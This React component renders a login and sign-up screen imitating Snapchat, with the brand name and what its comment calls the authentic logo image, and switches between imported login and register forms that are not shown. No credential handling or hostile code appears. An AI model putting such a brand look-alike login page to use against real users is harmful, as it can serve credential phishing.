import React, { useState } from "react";
import LoginForm from "./LoginForm";
import RegisterForm from "./RegisterForm";
import "./App.css";

// Authentic Snapchat Logo Component using the real image
const SnapchatLogo = () => (
  <div style={{
    width: "120px",
    height: "120px",
    background: "url('/snap.jpg') center center/cover",
    borderRadius: "20px",
    margin: "0 auto"
  }} />
);

function App() {
  const [showLogin, setShowLogin] = useState(true);

  return (
    <div className="snapchat-container">
      <div className="logo-container">
        <SnapchatLogo />
        <h1 className="app-title">Snapchat</h1>
      </div>

      {showLogin ? (
        <div className="form-container">
          <LoginForm />
          <div className="divider">
            <span>or</span>
          </div>
          <button className="secondary-btn" onClick={() => setShowLogin(false)}>
            Sign Up
          </button>
        </div>
      ) : (
        <div className="form-container">
          <RegisterForm />
          <div className="divider">
            <span>or</span>
          </div>
          <button className="secondary-btn" onClick={() => setShowLogin(true)}>
            Log In
          </button>
        </div>
      )}
    </div>
  );
}

export default App;